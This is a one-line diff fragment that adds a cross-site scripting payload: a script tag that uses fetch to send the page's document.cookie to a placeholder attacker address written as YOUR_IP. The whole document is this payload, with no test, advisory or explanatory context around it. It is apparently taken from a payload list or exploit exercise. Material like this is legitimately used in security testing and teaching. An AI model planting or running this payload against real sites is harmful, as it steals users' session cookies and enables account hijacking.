@@ -1,0 +1,1 @@
+<script>fetch('http://YOUR_IP/.session='+document.cookie)</script>
